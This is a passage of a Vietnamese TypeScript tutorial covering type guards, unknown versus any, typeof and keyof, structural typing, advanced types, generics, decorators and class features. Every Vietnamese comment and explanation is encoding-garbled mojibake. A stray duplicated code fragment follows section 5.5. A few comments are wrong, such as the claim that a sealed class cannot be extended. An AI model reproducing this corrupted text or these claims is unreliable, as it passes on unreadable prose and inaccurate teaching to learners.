    return value.toUpperCase(); // âœ… OK - string cÃ³ toUpperCase()
  } else {
    // Trong block nÃ y, TypeScript BIáº¾T cháº¯c value lÃ  number
    // VÃ¬ chá»‰ cÃ²n láº¡i number (Ä‘Ã£ loáº¡i trá»« string á»Ÿ trÃªn)
    return value.toFixed(2); // âœ… OK - number cÃ³ toFixed()
  }
}

processValue("hello"); // "HELLO"
processValue(123.456); // "123.46"
```

#### **5.2. instanceof guard - Kiá»ƒm tra class instance:**
```typescript
class Dog {
  bark() { console.log('Woof!'); }  // ChÃ³ cÃ³ bark()
}

class Cat {
  meow() { console.log('Meow!'); }  // MÃ¨o cÃ³ meow()
}

function makeSound(animal: Dog | Cat) {
  // âŒ KhÃ´ng narrow: TypeScript khÃ´ng biáº¿t animal lÃ  Dog hay Cat
  // animal.bark(); // Error: Cat khÃ´ng cÃ³ bark()
  
  // âœ… DÃ¹ng instanceof Ä‘á»ƒ narrow
  if (animal instanceof Dog) {
    // Trong block nÃ y: animal lÃ  Dog
    animal.bark(); // âœ… OK - Dog cÃ³ bark()
  } else {
    // Trong block nÃ y: animal lÃ  Cat (Ä‘Ã£ loáº¡i trá»« Dog)
    animal.meow(); // âœ… OK - Cat cÃ³ meow()
  }
}

makeSound(new Dog()); // "Woof!"
makeSound(new Cat()); // "Meow!"
```

#### **5.3. in operator - Kiá»ƒm tra property tá»“n táº¡i:**
```typescript
type Fish = { swim: () => void };  // CÃ¡ cÃ³ bÆ¡i
type Bird = { fly: () => void };   // Chim cÃ³ bay

function move(animal: Fish | Bird) {
  // Kiá»ƒm tra property 'swim' cÃ³ tá»“n táº¡i khÃ´ng
  if ('swim' in animal) {
    // Náº¿u cÃ³ swim â†’ cháº¯c cháº¯n lÃ  Fish
    animal.swim(); // âœ… TypeScript biáº¿t animal lÃ  Fish
  } else {
    // KhÃ´ng cÃ³ swim â†’ cháº¯c cháº¯n lÃ  Bird
    animal.fly(); // âœ… TypeScript biáº¿t animal lÃ  Bird
  }
}

move({ swim: () => console.log("Swimming") }); // Swimming
move({ fly: () => console.log("Flying") });    // Flying
```

#### **5.4. Discriminated Unions - Union vá»›i "tag" phÃ¢n biá»‡t:**
```typescript
// Má»—i type cÃ³ "tag" duy nháº¥t (status) Ä‘á»ƒ phÃ¢n biá»‡t
type Success = { 
  status: 'success';  // Tag = 'success'
  data: string;       // Chá»‰ Success má»›i cÃ³ data
};

type Error = { 
  status: 'error';    // Tag = 'error'
  error: string;      // Chá»‰ Error má»›i cÃ³ error
};

type Response = Success | Error;

function handleResponse(response: Response) {
  // Kiá»ƒm tra TAG Ä‘á»ƒ narrow
  if (response.status === 'success') {
    // TypeScript biáº¿t: status='success' â†’ type lÃ  Success
    console.log(response.data); // âœ… OK - Success cÃ³ .data
    // console.log(response.error); // âŒ Error: Success khÃ´ng cÃ³ .error
  } else {
    // TypeScript biáº¿t: status khÃ´ng pháº£i 'success' â†’ lÃ  Error
    console.log(response.error); // âœ… OK - Error cÃ³ .error
    // console.log(response.data); // âŒ Error: Error khÃ´ng cÃ³ .data
  }
}

// á»¨ng dá»¥ng thá»±c táº¿: API responses
type ApiResponse = 
  | { status: 'loading' }
  | { status: 'success'; data: User[] }
  | { status: 'error'; message: string };

function renderUI(response: ApiResponse) {
  switch (response.status) {
    case 'loading':
      return <Spinner />; // KhÃ´ng cÃ³ data, khÃ´ng cÃ³ message
    case 'success':
      return <UserList users={response.data} />; // âœ… CÃ³ data
    case 'error':
      return <Error message={response.message} />; // âœ… CÃ³ message
  }
}
```

#### **5.5. Custom Type Guards - Tá»± táº¡o function kiá»ƒm tra type:**
```typescript
interface User {
  name: string;
  email: string;
}

// Function nÃ y KHáº²NG Äá»ŠNH vá»›i TypeScript: "obj lÃ  User"
function isUser(obj: any): obj is User {
  //                       ^^^^^^^ Type predicate (kháº³ng Ä‘á»‹nh type)
  // Kiá»ƒm tra obj cÃ³ Ä‘á»§ properties cá»§a User khÃ´ng
  return obj 
    && typeof obj.name === 'string' 
    && typeof obj.email === 'string';
}

function processData(data: unknown) {
  // âŒ KhÃ´ng dÃ¹ng type guard
  // console.log(data.email); // Error: unknown khÃ´ng cÃ³ .email
  
  // âœ… DÃ¹ng custom type guard
  if (isUser(data)) {
    // Trong block nÃ y, TypeScript BIáº¾T data lÃ  User
    console.log(data.name);  // âœ… OK
    console.log(data.email); // âœ… OK
  } else {
    console.log("Not a valid user");
  }
}

processData({ name: "John", email: "john@example.com" }); // âœ… Valid user
processData({ name: "John" }); // âŒ Missing email â†’ "Not a valid user"
processData("string"); // âŒ Not an object â†’ "Not a valid user"
```
  name: string;
  email: string;
}

function isUser(obj: any): obj is User {
  return obj && typeof obj.name === 'string' && typeof obj.email === 'string';
}

function processData(data: unknown) {
  if (isUser(data)) {
    console.log(data.email); // âœ… TypeScript biáº¿t data lÃ  User
  }
}
```

---

### **6. unknown vs any**

> **any** = táº¯t type checking (nguy hiá»ƒm), **unknown** = type-safe alternative (an toÃ n hÆ¡n)

#### **6.1. any - "Táº¯t háº³n" TypeScript (nguy hiá»ƒm âš ï¸):**
```typescript
let value: any = "hello";

// âœ… Má»i thá»© Ä‘á»u OK vá»›i any - TypeScript KHÃ”NG kiá»ƒm tra gÃ¬ cáº£!
value = 123;        // Äá»•i thÃ nh number - OK
value = true;       // Äá»•i thÃ nh boolean - OK
value = { x: 1 };   // Äá»•i thÃ nh object - OK

// âš ï¸ NGUY HIá»‚M: Compile OK, nhÆ°ng RUNTIME ERROR!
value.toUpperCase(); // OK náº¿u value lÃ  string
                     // âŒ CRASH náº¿u value lÃ  number/boolean/object

value.nonExistentMethod(); // âœ… Compile OK
                           // âŒ Runtime error CHáº®C CHáº®N!

// any = "lÃ m gÃ¬ cÅ©ng Ä‘Æ°á»£c", TypeScript khÃ´ng can thiá»‡p
// â†’ Giá»‘ng nhÆ° viáº¿t JavaScript thuáº§n, máº¥t háº¿t lá»£i Ã­ch cá»§a TypeScript
```

#### **6.2. unknown - "ChÆ°a biáº¿t type, pháº£i kiá»ƒm tra trÆ°á»›c" (an toÃ n âœ…):**
```typescript
let value: unknown = "hello";

// âœ… GÃ¡n value: OK giá»‘ng any
value = 123;
value = true;
value = { x: 1 };

// âŒ KHÃ”NG thá»ƒ dÃ¹ng trá»±c tiáº¿p - TypeScript Báº®T BUá»˜C pháº£i check
// value.toUpperCase(); 
// âŒ Error: Object is of type 'unknown'
// TypeScript nÃ³i: "TÃ´i khÃ´ng biáº¿t value lÃ  gÃ¬, anh pháº£i check trÆ°á»›c!"

// âœ… Pháº£i narrowing (type checking) trÆ°á»›c khi dÃ¹ng
if (typeof value === 'string') {
  value.toUpperCase(); // âœ… OK - ÄÃ£ check value lÃ  string
}

if (typeof value === 'number') {
  value.toFixed(2); // âœ… OK - ÄÃ£ check value lÃ  number
}

// unknown buá»™c dev PHáº¢I suy nghÄ© vÃ  check type
// â†’ An toÃ n hÆ¡n, Ã­t bug hÆ¡n
```

#### **So sÃ¡nh chi tiáº¿t:**
| Feature | any | unknown |
|---------|-----|---------|
| **Type checking** | âŒ Táº¯t hoÃ n toÃ n (TypeScript bá» qua) | âœ… Báº¯t buá»™c check (TypeScript kiá»ƒm tra cháº·t) |
| **Assignment TO** | Assign cho Báº¤T Ká»² type nÃ o | Chá»‰ assign cho `unknown` hoáº·c `any` |
| **Assignment FROM** | Nháº­n giÃ¡ trá»‹ tá»« báº¥t ká»³ type nÃ o | Nháº­n giÃ¡ trá»‹ tá»« báº¥t ká»³ type nÃ o |
| **Operations** | âœ… Cho phÃ©p Táº¤T Cáº¢ operations | âŒ PHáº¢I narrowing trÆ°á»›c |
| **Safety** | âŒ Nguy hiá»ƒm (runtime errors) | âœ… An toÃ n (catch errors compile-time) |
| **Use case** | Migration JSâ†’TS, legacy code | API responses, user input, external data |

#### **VÃ­ dá»¥ thá»±c táº¿:**
```typescript
// âŒ DÃ¹ng any - Nguy hiá»ƒm
async function fetchData(): Promise<any> {
  const response = await fetch('/api/user');
  return response.json(); // any - TypeScript khÃ´ng biáº¿t gÃ¬
}

const data = await fetchData();
console.log(data.name.toUpperCase()); 
// âŒ Runtime error náº¿u:
// - data khÃ´ng cÃ³ .name
// - data.name khÃ´ng pháº£i string

// âœ… DÃ¹ng unknown - An toÃ n
async function fetchData(): Promise<unknown> {
  const response = await fetch('/api/user');
  return response.json(); // unknown - Pháº£i check sau
}

const data = await fetchData();

// Pháº£i validate trÆ°á»›c khi dÃ¹ng
if (
  typeof data === 'object' &&
  data !== null &&
  'name' in data &&
  typeof data.name === 'string'
) {
  console.log(data.name.toUpperCase()); // âœ… Safe!
} else {
  console.error('Invalid data format');
}

// Hoáº·c dÃ¹ng type guard
interface User {
  name: string;
  email: string;
}

function isUser(obj: unknown): obj is User {
  return typeof obj === 'object'
    && obj !== null
    && 'name' in obj
    && typeof (obj as any).name === 'string'
    && 'email' in obj
    && typeof (obj as any).email === 'string';
}

if (isUser(data)) {
  console.log(data.name.toUpperCase()); // âœ… Type-safe!
}
```

**ğŸ’¡ Best Practice:**
```typescript
// âŒ TRÃNH dÃ¹ng any
function processInput(input: any) { ... } // Nguy hiá»ƒm!

// âœ… DÃ¹ng unknown + type guard
function processInput(input: unknown) {
  if (typeof input === 'string') {
    // Xá»­ lÃ½ string
  } else if (typeof input === 'number') {
    // Xá»­ lÃ½ number
  }
}

// âœ… Hoáº·c dÃ¹ng generics
function processInput<T>(input: T) { ... } // Type-safe!

// ğŸ“Œ Quy táº¯c:
// - KhÃ´ng bao giá» dÃ¹ng any trá»« khi:
//   1. Migration tá»« JavaScript â†’ TypeScript (táº¡m thá»i)
//   2. Third-party library khÃ´ng cÃ³ type definitions
//   3. Prototype/POC nhanh (sau Ä‘Ã³ pháº£i fix)
// - LuÃ´n dÃ¹ng unknown cho:
//   1. API responses (external data)
//   2. User input (form data, query params)
//   3. JSON.parse() results
//   4. Data tá»« localStorage/sessionStorage
```

---

### **7. typeof & keyof Operators**

> **typeof** = láº¥y type tá»« value, **keyof** = láº¥y union cá»§a keys

#### **7.1. typeof - Láº¥y type tá»« JavaScript value:**
```typescript
// Case 1: Object literal
const user = {
  name: "John",
  age: 30,
  isActive: true
};

// Thay vÃ¬ viáº¿t interface thá»§ cÃ´ng:
// interface User {
//   name: string;
//   age: number;
//   isActive: boolean;
// }

// âœ… DÃ¹ng typeof Ä‘á»ƒ tá»± Ä‘á»™ng láº¥y type
type User = typeof user;
// Káº¿t quáº£: { name: string; age: number; isActive: boolean }

const newUser: User = {
  name: "Jane",
  age: 25,
  isActive: false
}; // âœ… OK


// Case 2: Config vá»›i as const
const config = {
  apiUrl: "https://api.example.com",
  timeout: 5000,
  retries: 3
} as const; // ÄÃ³ng bÄƒng values thÃ nh literal types

type Config = typeof config;
// Káº¿t quáº£: {
//   readonly apiUrl: "https://api.example.com";  â† Literal type, khÃ´ng pháº£i string
//   readonly timeout: 5000;                       â† Literal type, khÃ´ng pháº£i number
//   readonly retries: 3;                          â† Literal type, khÃ´ng pháº£i number
// }


// Case 3: Function
function createUser(name: string, age: number) {
  return { name, age, createdAt: new Date() };
}

type CreateUserFn = typeof createUser;
// Káº¿t quáº£: (name: string, age: number) => { name: string; age: number; createdAt: Date }

type CreateUserReturn = ReturnType<typeof createUser>;
// Káº¿t quáº£: { name: string; age: number; createdAt: Date }
```

#### **7.2. keyof - Láº¥y union cá»§a táº¥t cáº£ keys:**
```typescript
interface User {
  name: string;
  age: number;
  email: string;
}

// keyof láº¥y táº¥t cáº£ keys thÃ nh union type
type UserKeys = keyof User; 
// Káº¿t quáº£: "name" | "age" | "email"

// á»¨ng dá»¥ng: Type-safe property access
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  //                     ^^^^^^^^^^^^^^^ K pháº£i lÃ  key cá»§a T
  //                                                  ^^^^ Láº¥y type cá»§a property K
  return obj[key];
}

const user: User = { 
  name: "John", 
  age: 30, 
  email: "john@example.com" 
};

const name = getProperty(user, "name");   // type: string
const age = getProperty(user, "age");     // type: number
const email = getProperty(user, "email"); // type: string

// getProperty(user, "invalid"); // âŒ Error: "invalid" khÃ´ng pháº£i key cá»§a User
// getProperty(user, "address"); // âŒ Error: "address" khÃ´ng tá»“n táº¡i

// Type cá»§a return value Tá»° Äá»˜NG Ä‘Ãºng theo key!
```

#### **7.3. Káº¿t há»£p typeof & keyof - Láº¥y keys tá»« object value:**
```typescript
const ROUTES = {
  HOME: '/',
  ABOUT: '/about',
  CONTACT: '/contact',
  PRODUCTS: '/products'
} as const;

// Step 1: typeof ROUTES â†’ Láº¥y type cá»§a ROUTES
// type: {
//   readonly HOME: "/";
//   readonly ABOUT: "/about";
//   readonly CONTACT: "/contact";
//   readonly PRODUCTS: "/products";
// }

// Step 2: keyof typeof ROUTES â†’ Láº¥y keys
type RouteKeys = keyof typeof ROUTES; 
// Káº¿t quáº£: "HOME" | "ABOUT" | "CONTACT" | "PRODUCTS"

// Step 3: Láº¥y values
type RouteValues = typeof ROUTES[RouteKeys];
// Káº¿t quáº£: "/" | "/about" | "/contact" | "/products"


// á»¨ng dá»¥ng thá»±c táº¿: Type-safe routing
function navigate(route: RouteKeys) {
  window.location.href = ROUTES[route]; // âœ… Type-safe
}

navigate("HOME");     // âœ… OK
navigate("ABOUT");    // âœ… OK
// navigate("INVALID"); // âŒ Error: "INVALID" khÃ´ng pháº£i RouteKeys

// Hoáº·c navigate báº±ng value
function navigateToPath(path: RouteValues) {
  window.location.href = path; // âœ… Type-safe
}

navigateToPath("/");         // âœ… OK
navigateToPath("/about");    // âœ… OK
// navigateToPath("/invalid"); // âŒ Error: "/invalid" khÃ´ng pháº£i RouteValues
```

---

### **8. Structural Typing (Duck Typing)**

> TypeScript dÃ¹ng **structural typing** (so sÃ¡nh cáº¥u trÃºc), KHÃ”NG pháº£i **nominal typing** (so sÃ¡nh tÃªn class)

#### **8.1. Structural Typing - "Náº¿u trÃ´ng giá»‘ng vá»‹t, kÃªu nhÆ° vá»‹t â†’ lÃ  vá»‹t":**
```typescript
interface Point {
  x: number;
  y: number;
}

function logPoint(p: Point) {
  console.log(`${p.x}, ${p.y}`);
}

// Case 1: Object literal cÃ³ THá»ªA property
const point = { x: 10, y: 20, z: 30 };
//                              ^^^^^^ Thá»«a property z
logPoint(point); // âœ… OK!
// TypeScript CHá»ˆ quan tÃ¢m x vÃ  y cÃ³ Ä‘Ãºng type khÃ´ng
// Property z bá»‹ Bá» QUA

// Case 2: Class cÅ©ng OK náº¿u structure match
class Vector {
  constructor(public x: number, public y: number) {}
  // KhÃ´ng cáº§n implements Point!
}

const vector = new Vector(5, 10);
logPoint(vector); // âœ… OK!
// Vector cÃ³ x: number vÃ  y: number â†’ match Point

// Case 3: Object khÃ¡c tÃªn nhÆ°ng cÃ¹ng structure
interface Point3D {
  x: number;
  y: number;
  z: number;
}

const point3D: Point3D = { x: 1, y: 2, z: 3 };
logPoint(point3D); // âœ… OK!
// point3D cÃ³ x, y â†’ Ä‘á»§ Ä‘á»ƒ match Point


// So sÃ¡nh vá»›i Nominal Typing (C#, Java):
// class Point { x: number; y: number; }
// class Vector { x: number; y: number; }
// logPoint(new Vector()); // âŒ Error: Vector khÃ¡c Point (khÃ¡c tÃªn class)
//
// TypeScript: Chá»‰ quan tÃ¢m STRUCTURE (x, y)
```

#### **8.2. Excess Property Checking - Ngoáº¡i lá»‡ khi pass object literal:**
```typescript
interface Point {
  x: number;
  y: number;
}

function logPoint(p: Point) {
  console.log(`${p.x}, ${p.y}`);
}

// âŒ Error khi pass object literal TRá»°C TIáº¾P vá»›i property thá»«a
logPoint({ x: 10, y: 20, z: 30 }); 
// Error: Object literal may only specify known properties, 
//        and 'z' does not exist in type 'Point'

// âœ… OK khi gÃ¡n qua BIáº¾N trung gian
const point = { x: 10, y: 20, z: 30 };
logPoint(point); // OK!

// Táº¡i sao?
// - Object literal trá»±c tiáº¿p: TypeScript nghÄ© báº¡n NHáº¦M (typo)
// - GÃ¡n qua biáº¿n: TypeScript nghÄ© báº¡n Cá» TÃŒNH thá»«a property
```

**ğŸ’¡ Ã nghÄ©a Structural Typing:**
```typescript
// âœ… Æ¯u Ä‘iá»ƒm:
// 1. Linh hoáº¡t hÆ¡n nominal typing (C#, Java)
interface Renderable {
  render(): void;
}

class Button {
  render() { console.log("Button"); }
  // KhÃ´ng cáº§n: implements Renderable
}

class Panel {
  render() { console.log("Panel"); }
  // KhÃ´ng cáº§n: implements Renderable
}

function renderComponent(component: Renderable) {
  component.render();
}

renderComponent(new Button()); // âœ… OK
renderComponent(new Panel());  // âœ… OK
// Chá»‰ cáº§n cÃ³ method render() lÃ  Ä‘Æ°á»£c!


// 2. Duck Typing - "Náº¿u nÃ³ Ä‘i nhÆ° vá»‹t, kÃªu nhÆ° vá»‹t..."
interface Swimmer {
  swim(): void;
}

const duck = { swim: () => console.log("Swimming") };
const fish = { swim: () => console.log("Swimming") };
const person = { swim: () => console.log("Swimming") };

function makeSwim(swimmer: Swimmer) {
  swimmer.swim();
}

makeSwim(duck);   // âœ… OK
makeSwim(fish);   // âœ… OK
makeSwim(person); // âœ… OK
// Táº¥t cáº£ Ä‘á»u cÃ³ swim() â†’ Ä‘á»u lÃ  Swimmer


// âš ï¸ NhÆ°á»£c Ä‘iá»ƒm: CÃ³ thá»ƒ match nháº§m
interface Car {
  start(): void;
}

interface Engine {
  start(): void;
}

function startCar(car: Car) {
  car.start();
}

const engine: Engine = { start: () => console.log("Engine start") };
startCar(engine); // âœ… OK - NhÆ°ng engine KHÃ”NG pháº£i car!
// TypeScript khÃ´ng phÃ¢n biá»‡t vÃ¬ cÃ¹ng structure
```

---

### **9. Advanced Types**

#### **9.1. Conditional Types - "If-else" cho types:**
```typescript
// T extends U ? X : Y
type IsString<T> = T extends string ? true : false;

type A = IsString<string>; // true
type B = IsString<number>; // false

// á»¨ng dá»¥ng thá»±c táº¿
type NonNullable<T> = T extends null | undefined ? never : T;
type Result = NonNullable<string | null>; // string
```

#### **9.2. Mapped Types:**
```typescript
// Ãp dá»¥ng transformation cho táº¥t cáº£ properties
type Readonly<T> = {
  readonly [P in keyof T]: T[P];
};

type Nullable<T> = {
  [P in keyof T]: T[P] | null;
};

interface User {
  name: string;
  age: number;
}

type NullableUser = Nullable<User>;
// { name: string | null; age: number | null }
```

#### **9.3. Template Literal Types:**
```typescript
type Color = 'red' | 'green' | 'blue';
type Quantity = 'one' | 'two';

type ColorQuantity = `${Quantity}-${Color}`;
// "one-red" | "one-green" | "one-blue" | "two-red" | "two-green" | "two-blue"

// á»¨ng dá»¥ng vá»›i event handlers
type EventName = 'click' | 'focus' | 'blur';
type EventHandler = `on${Capitalize<EventName>}`;
// "onClick" | "onFocus" | "onBlur"
```

#### **9.4. Discriminated Unions:**
```typescript
type Shape =
  | { kind: 'circle'; radius: number }
  | { kind: 'square'; size: number }
  | { kind: 'rectangle'; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case 'circle':
      return Math.PI * shape.radius ** 2;
    case 'square':
      return shape.size ** 2;
    case 'rectangle':
      return shape.width * shape.height;
  }
}
```

#### **9.5. Branded Types:**
```typescript
// Táº¡o types phÃ¢n biá»‡t nominal
type Brand<K, T> = K & { __brand: T };

type USD = Brand<number, 'USD'>;
type EUR = Brand<number, 'EUR'>;

const usd = 100 as USD;
const eur = 100 as EUR;

function processUSD(amount: USD) {
  console.log(`Processing $${amount}`);
}

processUSD(usd); // âœ… OK
// processUSD(eur); // âŒ Error: EUR khÃ´ng assign cho USD
// processUSD(100); // âŒ Error: number khÃ´ng assign cho USD
```

#### **9.6. Module Augmentation:**
```typescript
// Má»Ÿ rá»™ng module cÃ³ sáºµn
declare module 'express' {
  interface Request {
    user?: {
      id: string;
      name: string;
    };
  }
}

// BÃ¢y giá» req.user cÃ³ type
app.get('/profile', (req, res) => {
  console.log(req.user?.name); // âœ… TypeScript hiá»ƒu
});
```

#### **9.7. Declaration Merging:**
```typescript
// Interface tá»± Ä‘á»™ng merge
interface Box {
  height: number;
  width: number;
}

interface Box {
  scale: number;
}

const box: Box = {
  height: 5,
  width: 6,
  scale: 10
}; // âœ… OK - merged interface

// Namespace merging
namespace Animals {
  export class Dog {}
}

namespace Animals {
  export class Cat {}
}

const dog = new Animals.Dog(); // âœ…
const cat = new Animals.Cat(); // âœ…
```

#### **9.8. Namespace vs Module:**
```typescript
// Namespace (cÅ©, internal organization)
namespace Utilities {
  export function log(msg: string) {
    console.log(msg);
  }
}

Utilities.log("Hello");

// Module (ES6, khuyáº¿n nghá»‹)
// utilities.ts
export function log(msg: string) {
  console.log(msg);
}

// main.ts
import { log } from './utilities';
log("Hello");
```

**ğŸ’¡ Best Practice:**
- DÃ¹ng **ES6 modules** (import/export), khÃ´ng dÃ¹ng namespace
- Namespace chá»‰ dÃ¹ng khi viáº¿t declaration files (.d.ts)

---

### **10. Generics - TÃ¡i sá»­ dá»¥ng Types**

#### **10.1. Generic Functions:**
```typescript
// KhÃ´ng generic - láº·p láº¡i code
function identityString(arg: string): string {
  return arg;
}

function identityNumber(arg: number): number {
  return arg;
}

// Generic - linh hoáº¡t
function identity<T>(arg: T): T {
  return arg;
}

const str = identity<string>("hello"); // type: string
const num = identity<number>(123); // type: number
const auto = identity("auto"); // TypeScript tá»± infer: string
```

#### **10.2. Generic Constraints:**
```typescript
// Giá»›i háº¡n T pháº£i cÃ³ property .length
interface HasLength {
  length: number;
}

function logLength<T extends HasLength>(arg: T): void {
  console.log(arg.length);
}

logLength("hello"); // âœ… string cÃ³ .length
logLength([1, 2, 3]); // âœ… array cÃ³ .length
logLength({ length: 10 }); // âœ… object cÃ³ .length
// logLength(123); // âŒ Error: number khÃ´ng cÃ³ .length
```

#### **10.3. Generic Classes:**
```typescript
class GenericStack<T> {
  private items: T[] = [];

  push(item: T): void {
    this.items.push(item);
  }

  pop(): T | undefined {
    return this.items.pop();
  }

  peek(): T | undefined {
    return this.items[this.items.length - 1];
  }
}

const numberStack = new GenericStack<number>();
numberStack.push(1);
numberStack.push(2);
const last = numberStack.pop(); // type: number | undefined

const stringStack = new GenericStack<string>();
stringStack.push("a");
stringStack.push("b");
```

#### **10.4. Generic Interfaces:**
```typescript
interface ApiResponse<T> {
  data: T;
  status: number;
  message: string;
}

interface User {
  id: number;
  name: string;
}

const userResponse: ApiResponse<User> = {
  data: { id: 1, name: "John" },
  status: 200,
  message: "Success"
};

const usersResponse: ApiResponse<User[]> = {
  data: [{ id: 1, name: "John" }, { id: 2, name: "Jane" }],
  status: 200,
  message: "Success"
};
```

#### **10.5. Multiple Type Parameters:**
```typescript
function merge<T, U>(obj1: T, obj2: U): T & U {
  return { ...obj1, ...obj2 };
}

const result = merge({ name: "John" }, { age: 30 });
// type: { name: string } & { age: number }
console.log(result.name, result.age); // âœ…
```

#### **10.6. Generic Utility Function:**
```typescript
// Táº¡o type-safe pick function
function pick<T, K extends keyof T>(obj: T, keys: K[]): Pick<T, K> {
  const result = {} as Pick<T, K>;
  keys.forEach(key => {
    result[key] = obj[key];
  });
  return result;
}

const user = { id: 1, name: "John", age: 30, email: "john@example.com" };
const subset = pick(user, ['id', 'name']);
// type: { id: number; name: string }
```

---

### **11. Decorators - Meta-programming**

Decorators lÃ  **experimental feature** (cáº§n `"experimentalDecorators": true` trong tsconfig.json).

#### **11.1. Class Decorator:**
```typescript
function sealed(constructor: Function) {
  Object.seal(constructor);
  Object.seal(constructor.prototype);
}

@sealed
class BugReport {
  type = "report";
  title: string;

  constructor(t: string) {
    this.title = t;
  }
}

// KhÃ´ng thá»ƒ extend BugReport vÃ¬ Ä‘Ã£ sealed
```

#### **11.2. Method Decorator:**
```typescript
function log(target: any, propertyKey: string, descriptor: PropertyDescriptor) {
  const originalMethod = descriptor.value;

  descriptor.value = function (...args: any[]) {
    console.log(`Calling ${propertyKey} with`, args);
    const result = originalMethod.apply(this, args);
    console.log(`Result:`, result);
    return result;
  };

  return descriptor;
}

class Calculator {
  @log
  add(a: number, b: number): number {
    return a + b;
  }
}

const calc = new Calculator();
calc.add(2, 3);
// Log: Calling add with [2, 3]
// Log: Result: 5
```

#### **11.3. Property Decorator:**
```typescript
function readonly(target: any, propertyKey: string) {
  Object.defineProperty(target, propertyKey, {
    writable: false
  });
}

class Person {
  @readonly
  name: string = "John";
}

const person = new Person();
// person.name = "Jane"; // âŒ Error á»Ÿ runtime (khÃ´ng thay Ä‘á»•i Ä‘Æ°á»£c)
```

#### **11.4. Parameter Decorator:**
```typescript
function required(target: any, propertyKey: string, parameterIndex: number) {
  console.log(`Parameter ${parameterIndex} of ${propertyKey} is required`);
}

class Greeter {
  greet(@required name: string) {
    return `Hello, ${name}`;
  }
}
```

**ğŸ’¡ Use Cases:**
- **Logging/Monitoring**: Track method calls
- **Validation**: Validate input/output
- **Dependency Injection**: Angular's DI system
- **ORM**: TypeORM, Prisma decorators
- **API Routes**: NestJS controllers

---

### **12. OOP trong TypeScript**

#### **12.1. Abstract Class:**
```typescript
abstract class Animal {
  constructor(public name: string) {}

  // Abstract method - pháº£i implement á»Ÿ subclass
  abstract makeSound(): void;

  // Concrete method - cÃ³ implementation
  move(): void {
    console.log(`${this.name} is moving`);
  }
}

class Dog extends Animal {
  makeSound(): void {
    console.log("Woof! Woof!");
  }
}

// const animal = new Animal("Generic"); // âŒ Error: Cannot create instance of abstract class
const dog = new Dog("Buddy");
dog.makeSound(); // "Woof! Woof!"
dog.move(); // "Buddy is moving"
```

#### **12.2. Interface Implementation:**
```typescript
interface Flyable {
  fly(): void;
  altitude: number;
}

interface Swimmable {
  swim(): void;
}

// Implement nhiá»u interfaces
class Duck implements Flyable, Swimmable {
  altitude: number = 0;

  fly(): void {
    this.altitude = 100;
    console.log("Duck is flying");
  }

  swim(): void {
    console.log("Duck is swimming");
  }
}
```

#### **12.3. Extends (Inheritance):**
```typescript
class Vehicle {
  constructor(public brand: string) {}

  start(): void {
    console.log(`${this.brand} starting...`);
  }
}

class Car extends Vehicle {
  constructor(brand: string, public model: string) {
    super(brand); // Gá»i constructor cá»§a parent
  }

  // Override method
  start(): void {
    super.start(); // Gá»i method cá»§a parent
    console.log(`Car ${this.model} ready to go!`);
  }
}

const myCar = new Car("Toyota", "Camry");
myCar.start();
// "Toyota starting..."
// "Car Camry ready to go!"
```

#### **12.4. Access Modifiers:**
```typescript
class BankAccount {
  public accountNumber: string; // Truy cáº­p má»i nÆ¡i
  protected balance: number; // Chá»‰ class nÃ y vÃ  subclass
  private pin: string; // Chá»‰ trong class nÃ y

  constructor(accountNumber: string, initialBalance: number, pin: string) {
    this.accountNumber = accountNumber;
    this.balance = initialBalance;
    this.pin = pin;
  }

  public withdraw(amount: number, inputPin: string): boolean {
    if (inputPin !== this.pin) {
      return false; // âŒ Sai PIN
    }
    if (amount > this.balance) {
      return false; // âŒ KhÃ´ng Ä‘á»§ tiá»n
    }
    this.balance -= amount;
    return true;
  }
}

class SavingsAccount extends BankAccount {
  calculateInterest(): number {
    return this.balance * 0.05; // âœ… OK - balance lÃ  protected
    // return this.pin; // âŒ Error - pin lÃ  private
  }
}

const account = new BankAccount("123", 1000, "1234");
console.log(account.accountNumber); // âœ… OK - public
// console.log(account.balance); // âŒ Error - protected
// console.log(account.pin); // âŒ Error - private
```

#### **12.5. Static Members:**
```typescript
class MathUtil {
  static PI: number = 3.14159;

  static calculateCircleArea(radius: number): number {
    return MathUtil.PI * radius * radius;
  }

  // Instance method khÃ´ng truy cáº­p Ä‘Æ°á»£c static members trá»±c tiáº¿p
  logPI(): void {
    console.log(MathUtil.PI); // Pháº£i dÃ¹ng ClassName.staticMember
  }
}

// Gá»i static member qua class name
console.log(MathUtil.PI);
console.log(MathUtil.calculateCircleArea(5));

// KhÃ´ng cáº§n táº¡o instance
// const util = new MathUtil(); // KhÃ´ng cáº§n thiáº¿t
```

#### **12.6. Getters & Setters:**
```typescript
class User {
  private _age: number = 0;

  get age(): number {
    return this._age;
  }

  set age(value: number) {
    if (value < 0 || value > 150) {
      throw new Error("Invalid age");
    }
    this._age = value;
  }
}

const user = new User();
user.age = 30; // âœ… Gá»i setter
console.log(user.age); // âœ… Gá»i getter
// user.age = -5; // âŒ Error: Invalid age
```

#### **12.7. Implements vs Extends:**
```typescript
// Interface - contract
interface Logger {
  log(message: string): void;
}

// Abstract class - partial implementation
abstract class BaseLogger {
  abstract log(message: string): void;
  
  logError(error: Error): void {
    this.log(`ERROR: ${error.message}`);
  }
}

// Implements interface - pháº£i implement táº¥t cáº£ methods
class ConsoleLogger implements Logger {
  log(message: string): void {
    console.log(message);
  }
}

// Extends abstract class - káº¿ thá»«a implementation
class FileLogger extends BaseLogger {
  log(message: string): void {
    // Write to file
    console.log(`[FILE] ${message}`);
  }
  // logError Ä‘Ã£ cÃ³ sáºµn tá»« BaseLogger
}

// CÃ³ thá»ƒ káº¿t há»£p extends vÃ  implements
class AdvancedLogger extends BaseLogger implements Logger {
  log(message: string): void {
    console.log(`[ADVANCED] ${message}`);
  }
}
```

---

### **ğŸ“Š So SÃ¡nh Tá»•ng Quan**

| Concept | Má»¥c Ä‘Ã­ch | Khi nÃ o dÃ¹ng |
|---------|----------|--------------|
| **type** | Äá»‹nh nghÄ©a type alias | Unions, intersections, mapped types |
| **interface** | Äá»‹nh nghÄ©a object shape | Public API, class contracts, declaration merging |
| **abstract class** | Base class vá»›i partial implementation | Chia sáº» code giá»¯a cÃ¡c subclass |
| **implements** | Class tuÃ¢n theo contract | Äáº£m báº£o class cÃ³ methods cáº§n thiáº¿t |
| **extends** | Káº¿ thá»«a class | TÃ¡i sá»­ dá»¥ng implementation |
| **as const** | Literal types immutable | Config, constants |
| **enum** | Named constants | Status codes, cÃ³ reverse mapping |
